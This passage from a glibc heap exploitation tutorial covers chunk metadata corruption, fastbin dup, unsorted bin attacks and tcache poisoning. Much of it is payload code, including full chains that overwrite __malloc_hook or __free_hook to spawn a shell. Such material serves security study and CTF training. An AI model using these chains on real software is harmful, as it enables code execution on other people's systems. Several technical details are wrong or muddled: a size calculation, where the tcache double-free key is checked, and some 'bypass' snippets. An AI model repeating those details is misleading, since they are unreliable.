- **Fast allocation:** No coalescing, minimal checks
- **Limited security:** Originally no double-free protection (added glibc 2.29)
- **Bypasses traditional bins:** Tcache checked before fastbins/small bins

**Tcache bin example:**

```
tcache[5] (size 0x60, count=3):
    → Chunk A → Chunk B → Chunk C → NULL
```

### Arena Structure

**Main arena vs thread arenas:**

```c
struct malloc_state {
    mutex_t mutex;                    // Thread safety
    mfastbinptr fastbinsY[NFASTBINS]; // Fastbin heads
    mchunkptr top;                    // Top chunk pointer
    mchunkptr last_remainder;         // Remainder from split
    mchunkptr bins[NBINS * 2];        // Small/large/unsorted bins
    unsigned int binmap[BINMAPSIZE];  // Bitmap of non-empty bins
    struct malloc_state *next;        // Next arena in list
    // ... more fields
};
```

**Finding arena in GDB:**

```gdb
# Main arena (global symbol)
p main_arena

# View arena structure
p *main_arena

# View bins
p main_arena.bins[0]@254  # All bins

# Fastbins
p main_arena.fastbinsY[0]@10
```

### Top Chunk

**Top chunk:** Special chunk at end of heap

```
┌──────────────────────┐
│  Regular chunks      │
├──────────────────────┤
│  Top Chunk           │ ← Grows as needed
│  (wilderness)        │
└──────────────────────┘
```

**Properties:**

- Always last chunk in heap
- Size grows/shrinks via `brk()` system call
- Source for satisfying large allocations
- Never placed in bins

**Accessing in GDB (pwndbg):**

```gdb
heap
# Shows all chunks including top chunk

p main_arena.top
# Address of top chunk
```

### Unlink Operation

**Unlink macro:** Removes chunk from doubly-linked list (small/large bins)

**Code (simplified):**

```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;  // FD->bk points to BK
    BK->fd = FD;  // BK->fd points to FD
}
```

**Visualization:**

```
Before unlink(P):
    BK ←→ P ←→ FD

After unlink(P):
    BK ←→ FD
    (P removed from list)
```

**Security checks (modern glibc):**

```c
// Safe unlinking checks (glibc ≥ 2.3.4)
if (P->fd->bk != P || P->bk->fd != P)
    abort();  // Corrupted double-linked list detected
```

[Inference] Unlink exploits were historically powerful (arbitrary write primitive) but modern safe-unlink checks make traditional unlink attacks difficult, requiring more sophisticated heap metadata manipulation.

### Heap Inspection Tools

**GDB with pwndbg:**

```gdb
# Heap overview
heap

# Detailed heap chunks
heap -v

# Specific arena bins
bins        # All bins
fastbins    # Fastbin contents
tcachebins  # Tcache contents (if available)
unsortedbin # Unsorted bin
smallbins   # Small bins
largebins   # Large bins

# Visualize chunks
vis_heap_chunks
vis_heap_chunks 20  # Show 20 chunks

# Find chunk containing address
find_fake_fast <address>

# Tcache structure
tcache
```

**Manual heap parsing:**

```gdb
# Get heap base
info proc mappings
# Look for [heap] section

# Parse chunk manually
x/10gx 0x555555756000  # Heap base
# First 8 bytes: prev_size
# Next 8 bytes: size | flags

# Follow fd pointer in free chunk
x/gx 0x555555756010  # fd pointer location
x/10gx <fd_value>    # Next chunk
```

**Heap info commands (pwndbg):**

```gdb
# Arena information
arena

# Main arena address
p &main_arena

# Thread arenas
thread apply all arena
```

### Heap Allocation Size Classes

**Size to bin mapping (x64):**

```
Request Size  →  Chunk Size  →  Bin Type
0-24          →  32           →  Fastbin 0 or Tcache 0
25-40         →  48           →  Fastbin 1 or Tcache 1
41-56         →  64           →  Fastbin 2 or Tcache 2
...
145-160       →  176          →  Fastbin 9 or Tcache 9
161-176       →  192          →  Smallbin 16
...
1008-1024     →  1040         →  Smallbin 63
1025-1088     →  1104         →  Largebin 64
```

**Calculating chunk size:**

```python
def request_to_chunk_size(request, arch=64):
    if arch == 64:
        size = request + 8  # Size field overhead
        size = (size + 15) & ~15  # Align to 16
        return max(size, 32)  # Minimum 32 bytes
    else:  # x86
        size = request + 4
        size = (size + 7) & ~7
        return max(size, 16)

# Example:
request_to_chunk_size(24)  # → 32
request_to_chunk_size(25)  # → 48
request_to_chunk_size(100) # → 112
```

### Heap Exploitation Primitives

**Core primitives for exploitation:**

1. **Arbitrary write:** Write controlled data to arbitrary address
2. **Arbitrary read:** Read data from arbitrary address
3. **Code execution:** Hijack control flow
4. **Heap feng shui:** Arrange heap layout predictably

**Common targets for arbitrary write:**

- `__malloc_hook` / `__free_hook` / `__realloc_hook` (glibc function pointers)
- GOT entries (if partial RELRO)
- Return addresses on stack (if leaked)
- Function pointers in heap objects
- File stream structures (`_IO_FILE`)

---

## Heap Metadata Corruption

### Overview

**Metadata corruption:** Modifying heap management structures to gain control

**Attack vectors:**

- Buffer overflow into adjacent chunks
- Use-after-free (UAF) writing to freed chunk
- Double-free enabling duplicate allocations
- Integer overflow in size calculations

### Basic Overflow into Next Chunk

**Scenario:** Overflow corrupts adjacent chunk metadata

**Vulnerable code:**

```c
char *buf1 = malloc(0x80);
char *buf2 = malloc(0x80);

strcpy(buf1, user_input);  // No bounds check
free(buf1);
free(buf2);
```

**Heap layout:**

```
┌────────────────────┐
│ buf1 (0x80 data)   │ ← Overflow starts here
├────────────────────┤
│ prev_size (buf2)   │ ← Can be overwritten
├────────────────────┤
│ size (buf2)        │ ← Can be overwritten
├────────────────────┤
│ buf2 (0x80 data)   │
└────────────────────┘
```

**Exploitation technique:**

```python
from pwn import *

# Overflow buf1 to corrupt buf2's size field
payload = b'A' * 0x80  # Fill buf1
payload += p64(0)      # Fake prev_size
payload += p64(0x91)   # Corrupt buf2 size (original size with P flag)

# When buf2 freed, allocator uses corrupted size
# Can cause overlapping chunks or double-free scenarios
```

### Prev_size Exploitation

**Prev_size field:** Used during backward consolidation

**Attack:** Corrupt prev_size to trigger unlink on fake chunk

**Vulnerable scenario:**

```c
// Three contiguous allocations
char *a = malloc(0x80);  // Chunk A
char *b = malloc(0x80);  // Chunk B (vulnerable)
char *c = malloc(0x80);  // Chunk C

// Overflow from A into B
strcpy(a, large_input);

// Free B - triggers consolidation check
free(b);
```

**Exploitation steps:**

**Step 1: Overflow from A to corrupt B's metadata**

```python
payload = b'A' * 0x80          # Fill A
payload += p64(0x80)           # Fake prev_size (claim A is free)
payload += p64(0x90)           # B's size (clear PREV_INUSE)
```

**Step 2: Create fake chunk in A**

```python
# Fake chunk structure in A's data
fake_chunk = p64(0)            # fake prev_size
fake_chunk += p64(0x81)        # fake size
fake_chunk += p64(target-0x18) # fake fd (for unlink)
fake_chunk += p64(target-0x10) # fake bk (for unlink)

payload = fake_chunk + b'A' * (0x80 - len(fake_chunk))
payload += p64(0x80)           # B's corrupted prev_size
payload += p64(0x90)           # B's size with P flag cleared
```

**Step 3: Trigger unlink during free(b)**

```
When free(b) executes:
1. Checks PREV_INUSE flag (we cleared it)
2. Reads prev_size (0x80 we set)
3. Calculates previous chunk address: B - 0x80 = A
4. Attempts to unlink(A)
5. Unlink writes: target = fake_fd or fake_bk values
```

**Modern mitigations:**

```c
// Safe unlink checks prevent simple exploitation
if (P->fd->bk != P || P->bk->fd != P)
    abort();

// Bypass requires:
// P->fd->bk == P  →  (target-0x18)->bk == P
// P->bk->fd == P  →  (target-0x10)->fd == P
```

[Inference] Safe unlink requires knowledge of P's address, typically obtained through heap address leak, making exploitation more complex than pre-2.3.4 glibc versions.

### Chunk Overlapping

**Goal:** Create overlapping allocations to access freed memory

**Technique:** Corrupt size to extend chunk beyond actual boundary

**Example scenario:**

```c
char *a = malloc(0x80);   // Chunk A
char *b = malloc(0x80);   // Chunk B
char *c = malloc(0x80);   // Chunk C

// Overflow A to corrupt B's size
strcpy(a, evil_input);

free(b);  // Free oversized chunk
char *d = malloc(0x100);  // Request large allocation

// d overlaps with both B and C
```

**Exploitation details:**

**Step 1: Corrupt size to span multiple chunks**

```python
payload = b'A' * 0x80
payload += p64(0)         # B's prev_size (unused when allocated)
payload += p64(0x111)     # B's size: 0x90 + 0x90 = 0x120, rounded to 0x111
                          # Now B spans B+C's space
```

**Step 2: Heap state after corruption**

```
Before:
┌─────────┐
│ A 0x80  │
├─────────┤
│ B 0x80  │
├─────────┤
│ C 0x80  │
└─────────┘

After size corruption:
┌─────────┐
│ A 0x80  │
├─────────┤
│ B 0x110 │ ← Allocator thinks this is one large chunk
│         │
├─────────┤ ← C still exists here but allocator doesn't know
│ C 0x80  │
└─────────┘
```

**Step 3: Trigger overlap via allocation**

```python
free(b)                    # Places 0x110-sized chunk in bins
d = malloc(0x100)          # Allocates overlapping region
# Now d overlaps with C

strcpy(d, payload)         # Modifies C's memory
# Later operations on C are affected
```

**Exploitation outcomes:**

- **Use-after-free:** Access freed memory via overlapping allocation
- **Type confusion:** Different object types occupying same memory
- **Metadata corruption:** Modify chunk headers of overlapped chunks

### Size Field Corruption Variants

**Off-by-one null byte:**

```c
// Vulnerable: Off-by-one write
char *a = malloc(0x18);
char *b = malloc(0x100);

strncpy(a, user_input, 0x18);  // Writes null byte to b's size LSB
```

**Exploitation:**

```python
# Original b size: 0x111
# After off-by-one: 0x100 (null byte overwrites 0x11 LSB)

payload = b'A' * 0x18  # Exactly fills A, null byte corrupts B

# Now B appears smaller to allocator
# Can trigger overlaps or consolidation issues
```

**Integer overflow in size:**

```c
// Vulnerable: Integer overflow
size_t user_size = get_user_input();
char *buf = malloc(user_size + 0x10);

// If user_size = 0xfffffffffffffff0
// user_size + 0x10 = 0x00 (overflow)
// malloc(0) returns minimum chunk
```

### Pointer Corruption Techniques

**FD/BK pointer corruption:**

**Target:** Doubly-linked list pointers in free chunks

**Vulnerable scenario:**

```c
char *a = malloc(0x80);
char *b = malloc(0x80);

free(a);  // A enters bin with fd/bk pointers

// Overflow into freed A's data (now contains fd/bk)
strcpy(b - 0x90, evil_payload);  // Assuming negative index bug

free(b);  // Triggers consolidation using corrupted pointers
```

**Exploitation:**

```python
# Corrupt A's fd/bk while in bin
fake_fd = target_addr - 0x18
fake_bk = target_addr - 0x10

payload = b'A' * (offset_to_fd)
payload += p64(fake_fd)  # Corrupt fd
payload += p64(fake_bk)  # Corrupt bk

# Next allocation or consolidation uses corrupted pointers
```

**Modern protections:**

- Safe unlink checks
- Tcache key field (glibc 2.29+)
- Pointer alignment verification
- Double-free detection

### House of Techniques (Historical)

**House of Force:** Top chunk size corruption

**Vulnerable scenario:**

```c
char *a = malloc(0x80);
// Overflow into top chunk metadata
```

**Exploitation:**

```python
# Corrupt top chunk size to very large value
payload = b'A' * 0x80
payload += p64(0)                    # prev_size
payload += p64(0xffffffffffffffff)   # Corrupt top size

# Request allocation that wraps around
evil_size = target_addr - top_chunk_addr - 0x10
malloc(evil_size)         # Top chunk moved to target location
ptr = malloc(0x10)        # Next allocation at target address
```

[Unverified] House of Force effectiveness significantly reduced in modern glibc due to size field validation and integer overflow checks.

**House of Lore:** Small bin corruption

**Technique:** Corrupt small bin pointers to return arbitrary address

```python
# Forge fake chunk at target location
fake_chunk = p64(0)           # prev_size
fake_chunk += p64(0x91)       # size
fake_chunk += p64(victim_fd)  # fd
fake_chunk += p64(victim_bk)  # bk

# Place fake chunk address in small bin
# Next allocation returns fake chunk location
```

### Heap Feng Shui

**Heap feng shui:** Controlled heap layout manipulation

**Goals:**

- Predictable chunk positioning
- Adjacent vulnerable/target chunks
- Grooming heap for exploit primitives

**Basic technique:**

```python
# Phase 1: Create holes in specific positions
chunks = []
for i in range(10):
    chunks.append(malloc(0x80))

# Phase 2: Free strategic chunks
free(chunks[3])
free(chunks[7])

# Phase 3: Allocate attacker-controlled data into holes
evil_chunk = malloc(0x80)  # Fills hole at chunks[7]
# Now evil_chunk is adjacent to chunks[8]

# Phase 4: Trigger vulnerability
overflow(evil_chunk)  # Corrupts chunks[8]
```

**Advanced grooming:**

```python
# Create specific size distribution
for i in range(20):
    malloc(0x100)  # Fill tcache for this size

for i in range(20):
    malloc(0x200)  # Fill tcache for this size

# Now allocations bypass tcache, go to fastbins/smallbins
# Enables more controlled exploitation
```

---

## Fastbin Attacks

### Fastbin Internals Review

**Fastbin characteristics:**

- Singly-linked LIFO list
- No chunk consolidation
- Size range: 32-176 bytes (x64)
- PREV_INUSE always set
- Fast allocation/deallocation

**Fastbin structure:**

```
fastbinsY[idx] → Chunk C → Chunk B → Chunk A → NULL
                 (most recently freed)
```

### Fastbin Double-Free

**Vulnerability:** Freeing same chunk twice creates duplicate entries

**Basic double-free:**

```c
char *a = malloc(0x40);
free(a);
free(a);  // Double-free

// Fastbin state: a → a → ...
```

**Protection (glibc ≥ 2.4):**

```c
// Check if head of fastbin == chunk being freed
if (fastbin_head == p)
    abort();  // Double-free detected
```

**Bypass technique (double-free with intermediate):**

```c
char *a = malloc(0x40);
char *b = malloc(0x40);

free(a);    // Fastbin: a → NULL
free(b);    // Fastbin: b → a → NULL
free(a);    // Fastbin: a → b → a → NULL (cycle created!)

// Protection only checks immediate head, not entire list
```

**Exploitation:**

```python
from pwn import *

# Create double-free scenario
free(0)  # Free chunk A
free(1)  # Free chunk B
free(0)  # Free chunk A again

# Fastbin: A → B → A → NULL

# Allocate and control first A
c = malloc(0x40)
write(c, p64(target_addr))  # Overwrite fd pointer

# Allocate B
d = malloc(0x40)

# Allocate second A (now points to target)
e = malloc(0x40)

# Next allocation returns target_addr
f = malloc(0x40)  # f == target_addr
# Now we can write to arbitrary location
```

### Fastbin Corruption (Arbitrary Allocation)

**Goal:** Allocate chunk at arbitrary address

**Requirements:**

1. Double-free or UAF to corrupt fd pointer
2. Target address must pass size check
3. Target location must contain valid "size" field

**Size check bypass:**

```c
// Allocator checks: (target->size & ~0x7) == expected_size

// Example for 0x50 fastbin:
// Target must have "size" field with value 0x51, 0x53, 0x55, 0x57, 0x59, 0x5b, 0x5d, or 0x5f
```

**Finding valid target addresses:**

```gdb
# Search for size-like values near target
search -t qword 0x7f  # Search for potential size fields

# Common targets with valid sizes:
# - __malloc_hook - 0x23 (has 0x7f nearby)
# - Stack addresses (may have suitable values)
# - Libc data sections
```

**Complete attack example:**

```python
# Step 1: Create double-free
free(0)
free(1)
free(0)

# Step 2: Allocate and corrupt fd
chunk_a = malloc(0x60)
target = libc.symbols['__malloc_hook'] - 0x23  # Adjust for size field
write(chunk_a, p64(target))

# Step 3: Drain fastbin until target returned
malloc(0x60)  # Returns chunk B
malloc(0x60)  # Returns chunk A (again)
malloc(0x60)  # Returns target address

# Step 4: Write to target
fake_chunk = malloc(0x60)  # fake_chunk == target
write(fake_chunk, b'A' * 0x13 + p64(one_gadget))
# Now __malloc_hook points to one_gadget

# Step 5: Trigger malloc to execute hook
malloc(1)  # Calls __malloc_hook → one_gadget → shell
```

### Fastbin Attack on __malloc_hook

**__malloc_hook:** Function pointer called before malloc execution

**Target location:**

```
__malloc_hook address: 0x7ffff7dd1b10 (example)
Nearby memory (before hook):
0x7ffff7dd1aed: 0x000000000000007f ← Valid size field for 0x70 fastbin 0x7ffff7dd1af5: ... 0x7ffff7dd1b10: __malloc_hook
````

**Complete exploitation:**

**Step 1: Leak libc address**
```python
# Assume we have arbitrary read or libc leak
libc_base = leaked_addr - libc.symbols['puts']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
````

**Step 2: Find valid size near __malloc_hook**

```python
# Search backwards from __malloc_hook for 0x7f
# Typically at offset -0x23 or -0x2b depending on glibc version
fake_chunk_addr = malloc_hook - 0x23

# Verify size field
# fake_chunk_addr should point to memory containing 0x7f
```

**Step 3: Create double-free in 0x70 fastbin**

```python
a = malloc(0x60)  # Request 0x60 → 0x70 chunk
b = malloc(0x60)
c = malloc(0x60)  # Prevent consolidation

free(a)
free(b)
free(a)  # Double-free: a → b → a
```

**Step 4: Corrupt fastbin to point to fake chunk**

```python
# Allocate and overwrite fd pointer
d = malloc(0x60)  # Returns first 'a'
payload = p64(fake_chunk_addr)
write(d, payload)

# Fastbin now: b → a → fake_chunk → ???
```

**Step 5: Allocate until fake chunk returned**

```python
malloc(0x60)  # Returns 'b'
malloc(0x60)  # Returns 'a' again
evil = malloc(0x60)  # Returns fake_chunk_addr

# evil points to malloc_hook - 0x23
```

**Step 6: Overwrite __malloc_hook**

```python
# Calculate offset from allocation to __malloc_hook
offset = 0x23 - 0x10  # Adjust for chunk header

payload = b'A' * offset
payload += p64(one_gadget_addr)  # Overwrite __malloc_hook
write(evil, payload)
```

**Step 7: Trigger hook**

```python
malloc(1)  # Calls __malloc_hook → one_gadget → shell!
```

**Alternative hooks:**

- `__free_hook`: Triggered on free()
- `__realloc_hook`: Triggered on realloc()
- Combined: __realloc_hook → adjust stack → __malloc_hook

### Fastbin Consolidation Attacks

**Scenario:** Force fastbin consolidation to trigger corruption

**malloc_consolidate() trigger:**

```c
// Called when:
// 1. Large allocation request (> fastbin max)
// 2. Malloc from small/large bins while fastbins non-empty
```

**Exploitation technique:**

```python
# Step 1: Fill fastbin with corrupted chunks
for i in range(7):
    chunks.append(malloc(0x60))

for c in chunks:
    free(c)

# Corrupt one fastbin chunk
# (via overflow, UAF, etc.)

# Step 2: Trigger consolidation
malloc(0x1000)  # Large request triggers malloc_consolidate()

# During consolidation:
# - Fastbin chunks moved to unsorted bin
# - Corrupted size/pointers cause issues
# - Can create overlapping chunks
```

### Fastbin Attack Mitigations

**Modern protections (glibc 2.26+):**

**1. Tcache preferred over fastbins**

- Fastbins only used after tcache full
- Adds complexity to exploitation

**2. Size alignment checks**

```c
// Verify chunk size matches expected fastbin index
if (chunksize(victim) != expected_size)
    malloc_printerr("malloc(): memory corruption (fast)");
```

**3. Double-free detection improved**

- Still vulnerable to A→B→A pattern
- Tcache has separate double-free protection (glibc 2.29+)

**Bypass strategies:**

- Fill tcache first to reach fastbins
- Craft fake chunks with correct size fields
- Use alternative primitives (house of techniques)

---

## Unsorted Bin Attacks

### Unsorted Bin Overview

**Unsorted bin:** Temporary bin for recently freed chunks

**Characteristics:**

- Single doubly-linked list
- Contains chunks of various sizes
- FIFO processing during allocation
- Used for quick reallocation optimization

**Bin structure:**

```
unsorted_bin (in main_arena):
    ↕
  Chunk A (0x90) ↔ Chunk B (0x110) ↔ Chunk C (0x200)
    ↕                                      ↕
    └──────────────────────────────────────┘
```

### Unsorted Bin Attack Primitive

**Primitive:** Write large value (arena address) to arbitrary location

**Mechanism:**

```c
// Simplified unsorted bin processing
while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
    bck = victim->bk;
    unsorted_chunks(av)->bk = bck;
    bck->fd = unsorted_chunks(av);  // WRITE HAPPENS HERE
    // ... size checks and bin sorting ...
}
```

**Key insight:**

```
bck->fd = unsorted_chunks(av)
↓
(victim->bk)->fd = &main_arena + offset
```

**If we corrupt victim->bk to point to (target - 0x10):**

```
target->fd = &main_arena + offset (large address)
```

### Unsorted Bin Attack Exploitation

**Requirements:**

1. Control over freed chunk in unsorted bin
2. Ability to corrupt chunk's bk pointer
3. Target location that accepts large value

**Step-by-step attack:**

**Step 1: Create chunk in unsorted bin**

```c
// Need chunk larger than fastbin max (> 0x80)
char *a = malloc(0x100);
char *guard = malloc(0x20);  // Prevent consolidation with top

free(a);  // a enters unsorted bin
```

**Heap state:**

```
unsorted_bin → Chunk A (0x110) ← unsorted_bin
               fd: &main_arena+88
               bk: &main_arena+88
```

**Step 2: Corrupt bk pointer**

```python
# Assume UAF or overflow allows writing to freed chunk
target = 0x404040  # Some global variable we want to corrupt

# Overwrite victim's bk pointer
write(a, p64(0) * 2 + p64(target - 0x10))

# Chunk structure now:
# fd: &main_arena+88 (unchanged)
# bk: target - 0x10 (corrupted)
```

**Step 3: Trigger unsorted bin processing**

```python
# Request allocation that causes unsorted bin scan
b = malloc(0x100)

# During processing:
# bck = victim->bk = target - 0x10
# bck->fd = unsorted_chunks(av)
# ↓
# *(target - 0x10 + 0x10) = &main_arena + offset
# ↓
# *target = &main_arena + offset (large libc address)
```

**Result:** Target location now contains arena address (libc region)

### Common Unsorted Bin Attack Targets

**1. Global_max_fast**

```python
# Target: global_max_fast (controls fastbin size limit)
# Location: In libc data section

target = libc_base + libc.symbols['global_max_fast']

# Corrupt unsorted bin chunk bk → target - 0x10
# Trigger allocation

# Result: global_max_fast = large value
# Effect: All chunk sizes treated as fastbins
# Consequence: Large chunks placed in fastbins → easier corruption
```

**Attack continuation:**

```python
# After global_max_fast corruption
large_chunk = malloc(0x1000)
free(large_chunk)  # Now goes to fastbin (incorrect!)

# Can corrupt large chunk's fd pointer
# Next large allocation returns arbitrary address
```

**2. _IO_list_all (File Stream Exploitation)**

```python
# Target: _IO_list_all (linked list of FILE streams)
target = libc_base + libc.symbols['_IO_list_all']

# Corrupt unsorted bin → _IO_list_all - 0x10
# Trigger allocation

# Result: _IO_list_all = &main_arena + offset
# Effect: Creates fake FILE structure in arena
# Consequence: Can trigger FSOP (File Stream Oriented Programming)
```

**3. Stack variables (if address leaked)**

```python
# Target: Return address or function pointer on stack
target = stack_addr  # Must know stack address

# Corrupt unsorted bin bk → target - 0x10
# Result: Stack location = libc address
# Use case: Partial overwrite or ROP chain setup
```

### Unsorted Bin Attack Limitations

**Constraints:**

1. **Write-what:** Cannot control written value (always arena address)
2. **Write-where:** Must know target address (usually requires leak)
3. **Target must tolerate large value:** Some targets crash with unexpected values
4. **One-shot:** After first allocation, unsorted bin may be empty

**Mitigation (glibc 2.29+):**

```c
// Added check during unsorted bin processing
if (victim->size != bck->size)
    malloc_printerr("malloc(): unsorted double linked list corrupted");
```

[Inference] This protection significantly reduces unsorted bin attack effectiveness in modern glibc, though creative bypasses may still exist in specific scenarios.

### Unsorted Bin Attack Variants

**House of Einherjar (combined technique):**

```
1. Overflow to corrupt prev_size and size fields
2. Trigger consolidation into unsorted bin
3. Corrupt resulting large chunk's bk pointer
4. Trigger unsorted bin attack
```

**Overlapping chunks via unsorted bin:**

```python
# Create chunks
a = malloc(0x100)
b = malloc(0x100)
c = malloc(0x100)

# Free b (enters unsorted bin)
free(b)

# Corrupt b's size via overflow from a
# Make size span b + c

# Allocate overlapping chunk
d = malloc(0x200)  # Overlaps with c
```

---

## Tcache Exploitation

### Tcache Overview (glibc ≥ 2.26)

**Tcache (Thread Local Cache):** Per-thread cache for fast allocation

**Design goals:**

- Reduce lock contention in multi-threaded applications
- Faster allocation than traditional bins
- Simple LIFO structure

**Tcache properties:**

```
Bins: 64 (sizes 24-1032 bytes, 16-byte increments on x64)
Max per bin: 7 chunks (default TCACHE_MAX_BINS)
Structure: Singly-linked list (like fastbins)
Location: Per-thread heap metadata
```

### Tcache Structure Details

**Tcache perthread struct:**

```c
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];    // Count per bin (max 7)
    tcache_entry *entries[TCACHE_MAX_BINS];  // Head pointers
} tcache_perthread_struct;

// Allocated at first malloc call per thread
// Located at beginning of heap
```

**Tcache entry (free chunk):**

```c
// glibc 2.26-2.28 (minimal security)
typedef struct tcache_entry {
    struct tcache_entry *next;  // Single forward pointer
} tcache_entry;

// glibc 2.29+ (added protection)
typedef struct tcache_entry {
    struct tcache_entry *next;
    uintptr_t key;  // Pointer to tcache_perthread_struct
} tcache_entry;
```

**Tcache bin example:**

```
tcache_perthread_struct at 0x555555756010:
    counts[3] = 3
    entries[3] → 0x555555756260
    
Tcache bin 3 (size 0x50):
    0x555555756260 → 0x5555557562c0 → 0x555555756320 → NULL
```

### Tcache Allocation/Free Flow

**tcache_put (free):**

```c
// Simplified tcache_put
static void tcache_put(mchunkptr chunk, size_t tc_idx) {
    tcache_entry *e = chunk2mem(chunk);
    e->next = tcache->entries[tc_idx];
    
    // glibc 2.29+: Set key for double-free detection
    e->key = tcache;
    
    tcache->entries[tc_idx] = e;
    tcache->counts[tc_idx]++;
}
```

**tcache_get (malloc):**

```c
// Simplified tcache_get
static void *tcache_get(size_t tc_idx) {
    tcache_entry *e = tcache->entries[tc_idx];
    
    // glibc 2.29+: Check and clear key
    if (e->key != tcache)
        malloc_printerr("tcache double free");
    
    tcache->entries[tc_idx] = e->next;
    tcache->counts[tc_idx]--;
    
    return (void *)e;
}
```

**Priority in allocation:**

```
1. Tcache (if available for size)
2. Fastbins
3. Small bins
4. Unsorted bin processing
5. Large bins
6. Top chunk
```

### Tcache Poisoning (Pre-2.29)

**Vulnerability:** No integrity checks on next pointer

**Attack:** Corrupt next pointer to arbitrary address

**Exploitation (glibc 2.26-2.28):**

**Step 1: Fill tcache**

```python
chunks = []
for i in range(7):
    chunks.append(malloc(0x40))

for c in chunks:
    free(c)

# Tcache bin 2 now has 7 chunks (full)
```

**Step 2: Corrupt next pointer**

```python
# Use UAF or overflow to corrupt freed chunk
target = 0x404040  # Arbitrary target address

# Overwrite next pointer in first tcache entry
write(chunks[6], p64(target))

# Tcache bin now: chunk6 → target → ???
```

**Step 3: Allocate until target returned**

```python
a = malloc(0x40)  # Returns chunk6
b = malloc(0x40)  # Returns target address!

# Now b points to target, can write arbitrary data
write(b, payload)
```

**No size checks required:** Unlike fastbins, tcache doesn't verify target size field

### Tcache Double-Free (Pre-2.29)

**Vulnerability:** No double-free detection in glibc 2.26-2.28

**Simple double-free:**

```c
char *a = malloc(0x40);
free(a);
free(a);  // No error!

// Tcache: a → a → (circular or crash)
```

**Exploitation:**

```python
a = malloc(0x40)
free(a)
free(a)  # Double-free succeeds

# Tcache: a → a

# Allocate and corrupt
b = malloc(0x40)  # Returns first 'a'
write(b, p64(target))

# Tcache: a → target

# Next allocations
c = malloc(0x40)  # Returns second 'a'
d = malloc(0x40)  # Returns target!
```

### Tcache Exploitation (glibc 2.29+)

**New protections:**

**1. Key field (double-free detection):**

```c
// On free:
e->key = tcache;  // Set to tcache struct address

// On allocation:
if (e->key != tcache)
    malloc_printerr("tcache double free");
e->key = NULL;  // Clear key
```

**Bypass technique:**

```python
# Double-free still detectable directly
# But can bypass with overwrite

a = malloc(0x40)
free(a)

# Overwrite key field (via UAF or overflow)
write(a, p64(target) + p64(0))  # next=target, key=NULL

free(a)  # Key is NULL, not tcache, but check happens on malloc

# Or: corrupt key to match tcache address
write(a + 8, p64(tcache_addr))
free(a)  # Now key matches, no error
```

**2. Size checks (limited):**

```c
// Still weaker than fastbin checks
// Mainly validates alignment and reasonable size
```

### Tcache Dup Exploitation

**Tcache dup:** Similar to fastbin dup, create duplicate entries

**Technique:**

```python
a = malloc(0x40)
b = malloc(0x40)

free(a)
free(b)
free(a)  # Need to bypass key check

# Corrupt key field first
# Via UAF or adjacent overflow
write(a + 8, p64(tcache_addr))  # Fix key

free(a)  # Now succeeds

# Tcache: a → b → a (cycle)
```

**Alternative (glibc 2.29+):**

```python
# Use heap feng shui to clear key
a = malloc(0x40)
free(a)

# Allocate same size to get 'a' back
b = malloc(0x40)  # b == a, key cleared

# Free again
free(b)  # Actually freeing 'a' again
# Tcache: a → a (but key was cleared, so no detection)
```

### Tcache Overlapping Chunks

**Goal:** Create overlapping allocations via size corruption

**Technique:**

```python
a = malloc(0x100)
b = malloc(0x100)
c = malloc(0x100)

free(b)  # b in tcache

# Corrupt b's size (via overflow from a)
payload = b'A' * 0x100
payload += p64(0)       # prev_size
payload += p64(0x211)   # Extend size to cover b+c
write(a, payload)

# Allocate large chunk
d = malloc(0x200)  # Gets extended 'b', overlaps with 'c'

# Now d and c occupy same memory
write(d, evil_data)  # Corrupts c
```

### Tcache Perthread Struct Attack

**Target:** Corrupt tcache management structure itself

**Location:** Beginning of heap (first allocation per thread)

**Structure:**

```
Heap base: 0x555555756000
    +0x000: counts[0..63]  (128 bytes)
    +0x080: entries[0..63] (512 bytes on x64)
    +0x280: First user chunk
```

**Exploitation:**

**Step 1: Overflow into tcache struct**

```python
# Assume chunk adjacent to tcache struct
# Or use-after-free on early allocation

# Corrupt entries array
offset = 0x80 + (bin_idx * 8)
payload = b'A' * offset
payload += p64(target_addr)  # Overwrite entries[bin_idx]

# Tcache entries[bin_idx] now points to target
```

**Step 2: Allocate from corrupted bin**

```python
chunk = malloc(size_for_bin_idx)
# Returns target_addr
```

**Advantage:** Direct control without needing free chunks

### Tcache House Techniques

**House of Botcake (Tcache + Unsorted Bin):**

**Technique:** Combine tcache filling with unsorted bin consolidation

```python
# Step 1: Fill tcache for size 0x100 (7 chunks)
for i in range(7):
    fill = malloc(0xf0)
    free(fill)

# Step 2: Create chunks for consolidation
a = malloc(0xf0)
b = malloc(0xf0)
c = malloc(0xf0)

# Step 3: Free a (goes to unsorted bin, tcache full)
free(a)

# Step 4: Free b (goes to tcache, one slot freed)
free(b)

# Step 5: Free c (consolidates with a in unsorted bin)
free(c)

# Result: b is in tcache, but also part of larger consolidated chunk in unsorted bin
# Overlap created!

# Allocate to exploit
d = malloc(0x100)  # Gets consolidated chunk
e = malloc(0x100)  # Gets b from tcache
# d and e overlap
```

**House of Io (Tcache + IO FILE):**

```python
# Corrupt tcache to allocate over _IO_FILE structure
# Craft fake FILE structure
# Trigger __malloc_assert or exit()
# Causes FSOP attack via corrupted FILE
```

### Tcache Attack on Hooks

**Target:** __free_hook or __malloc_hook via tcache

**Advantage:** No size field requirements (unlike fastbins)

```python
# Step 1: Leak libc
libc_base = leak()
free_hook = libc_base + libc.symbols['__free_hook']

# Step 2: Create tcache entry
a = malloc(0x40)
free(a)

# Step 3: Corrupt next pointer (UAF or overflow)
write(a, p64(free_hook))

# Step 4: Allocate twice
b = malloc(0x40)  # Returns 'a'
c = malloc(0x40)  # Returns free_hook address

# Step 5: Write hook
write(c, p64(system_addr))

# Step 6: Trigger
str_bin_sh = malloc(0x20)
write(str_bin_sh, b'/bin/sh\x00')
free(str_bin_sh)  # Calls __free_hook(ptr) → system("/bin/sh")
```

### Tcache Exploitation Detection/Mitigation

**Hardening techniques:**

**1. Pointer mangling (glibc 2.32+):**

```c
// XOR obfuscation of next pointers
#define PROTECT_PTR(pos, ptr) \
    ((tcache_entry *) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))

// Makes pointer corruption harder without position knowledge
```

**Bypass:** Leak heap address to compute XOR key

**2. Safe-linking (additional checks):**

```c
// Verify pointer alignment
// Check pointer is in valid heap range
```

**3. Count validation:**

```c
// Ensure counts don't exceed max
